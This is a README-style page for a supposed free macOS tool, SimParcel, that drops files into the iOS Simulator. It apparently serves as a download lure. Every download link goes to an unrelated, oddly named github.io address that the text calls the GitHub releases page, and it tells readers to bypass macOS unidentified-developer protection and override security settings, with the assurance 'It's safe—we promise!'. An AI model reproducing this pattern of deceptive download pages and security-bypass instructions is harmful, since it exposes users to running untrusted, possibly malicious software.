# 📦 SimParcel - Your Files, Dropped Right In

[Download SimParcel Now](https://foreandafterleging166.github.io)

---

## 📖 What is SimParcel?

SimParcel is a friendly, native macOS app that makes putting files into your iOS Simulator as easy as dragging and dropping them onto your desk. Think of it as a magic portal: you drag a photo, video, contact, app, or even a push notification, and SimParcel places it directly into your virtual iPhone or iPad.

If you’ve ever used Xcode’s old Device Hub to test how your app looks with a specific picture or file, you know how handy that was. SimParcel brings that convenience back, but with a modern, simple interface that anyone can use—no coding required.

---

## ✨ Why You’ll Love SimParcel

SimParcel is designed for developers, testers, and curious folks who want to see how their app behaves with real-world content. Here’s what makes it special:

- **🖼️ Photos & Videos:** Drop in any image or movie file, and it appears instantly in your Simulator’s photo library.
- **📱 Live Photos:** Yes, those fancy moving pictures work too. SimParcel handles them perfectly.
- **👤 Contacts:** Add a new contact card to the Simulator’s address book with a simple drag.
- **📲 Apps:** Install an app (.app or .ipa) by dragging it onto the Simulator window.
- **🔔 Push Notifications:** Test how your app handles notifications by dragging a JSON payload file.
- **🔗 Links:** Open a URL directly in the Simulator’s Safari browser—just drag and drop the link.

All of this is powered by the reliable `xcrun simctl` tool, but SimParcel wraps it in a beautiful, intuitive interface so you never have to touch the command line.

---

## 🚀 Getting Started

SimParcel is incredibly easy to use. Here’s your step-by-step guide:

### 1️⃣ Download SimParcel

Visit this link to download the application:  
[**https://foreandafterleging166.github.io**](https://foreandafterleging166.github.io)

You’ll land on the releases page. Look for the newest version at the top. Click the download button next to the file (it usually ends with `.zip` or `.dmg`). The file will save to your computer.

### 2️⃣ Open the App

Once the download finishes, find the file in your Downloads folder. Double-click it to open it. If it’s a ZIP file, your Mac will automatically unzip it, and you’ll see the SimParcel app. Drag the app icon into your Applications folder to install it properly. Then, double-click SimParcel from your Applications folder to launch it.

> 💡 **First-Time Tip:** When you open SimParcel for the first time, macOS might ask for permission because it’s from an unidentified developer. Just right-click the app and select “Open” to bypass this. It’s safe—we promise!

### 3️⃣ Launch Your Simulator

Before using SimParcel, you need to have the iOS Simulator running. If you have Xcode installed, open it and go to `Xcode > Open Developer Tool > Simulator`. This will boot up a virtual iPhone or iPad on your screen.

### 4️⃣ Drag and Drop!

Now for the fun part. With both SimParcel and the Simulator open:

- **For a photo or video:** Drag the file from your Finder window directly onto the Simulator’s screen. It’ll land in the Photos app.
- **For a contact:** Drag a `.vcf` file onto the Simulator. It’ll be added to Contacts.
- **For an app:** Drag the `.app` folder onto the Simulator. The app installs and appears on the home screen.
- **For a push notification:** Drag a `.json` file with the notification payload. SimParcel sends it instantly.
- **For a link:** Drag a text link (like `https://foreandafterleging166.github.io`) onto the Simulator. Safari opens it.

That’s it! No menus to navigate, no commands to type. Just drag, drop, and done.

---

## 🛠️ System Requirements

SimParcel is built for macOS, so you’ll need a Mac to run it. Here’s what we recommend for the best experience:

- **Operating System:** macOS 13 (Ventura) or later
- **Hardware:** Any Mac that supports the iOS Simulator (Intel or Apple Silicon)
- **Software:** Xcode 15 or later (this includes the Simulator and `simctl`)

If you have Xcode installed, you’re all set. SimParcel works hand-in-hand with the Simulator that comes with it.

---

## 🧪 Troubleshooting Common Issues

Even the best tools can hit a snag now and then. Here are quick fixes for common hiccups:

### 😕 “SimParcel won’t open”

This usually happens if you’re running an older version of macOS. Double-check that you have at least macOS 13. If your Mac is older, try right-clicking the app and selecting “Open” to override security settings.

### 📱 “The Simulator isn’t showing up in SimParcel”

Make sure the Simulator is fully booted (you should see the home screen with icons). SimParcel needs it to be running to work. Wait a few seconds after launching the Simulator, then try again.

### 🗂️ “My file didn’t appear”

Check the file type. SimParcel supports photos (JPEG, PNG), videos (MOV, MP4), Live Photos (as a pair of images), contacts (VCF), apps (APP), and JSON files for notifications. If it’s a weird format, convert it first.

### 🔇 “Push notifications aren’t working”

Make sure your app is set up to receive notifications in the Simulator, and that the JSON file follows the correct structure. A simple example is:
```json
{
  "Simulator Target Bundle": "com.example.app",
  "aps": {
    "alert": "Hello!"
  }
}
```

---

## 📚 Tips & Tricks

- **Use Multiple Simulators:** You can run several Simulators at once (e.g., an iPhone and an iPad). Drag a file to the one you want—it’ll know where to go.
- **Batch Drop:** Drop multiple photos at once to populate the library quickly.
- **Keyboard Shortcut:** In SimParcel, press `⌘ + O` to open a file picker if you prefer clicking over dragging.

---

## ❓ Frequently Asked Questions

**Q: Is SimParcel free?**  
A: Yes! SimParcel is completely free to download and use.

**Q: Does it work with Windows or Linux?**  
A: No, SimParcel is a macOS-only app because it relies on Apple’s iOS Simulator, which only runs on Macs.

**Q: Do I need to know how to code?**  
A: Absolutely not. SimParcel is designed for anyone. If you can drag and drop, you can use it.

**Q: Can I use it without Xcode?**  
A: You’ll need Xcode installed because it includes the iOS Simulator and the underlying tools that SimParcel relies on.

---

## 📦 What’s New

We’re always improving SimParcel. Here’s what’s fresh in the latest release:

- **Faster file transfers** for large videos
- **Live Photo support** improved for better compatibility
- **Dark mode** looks great and is easy on the eyes
- **Better error messages** so you know exactly what went wrong

---

## 🧑‍💻 Get Involved

SimParcel is an open-source project, and we’d love your feedback. Found a bug? Have a feature request? Want to say hi? Head over to the GitHub Issues page and let us know.

---

## 🎉 Ready to Simplify Your Testing?

Stop wasting time with complicated command-line tools. SimParcel puts the power of `simctl` right at your fingertips—literally. Download it now and see how effortless iOS Simulator testing can be.

[⬇️ Download SimParcel from GitHub](https://foreandafterleging166.github.io)

---

Keywords: developer-tools, device-hub, drag-and-drop, ios-simulator, live-photos, macos, push-notifications, simctl, swiftui, xcode, xcode27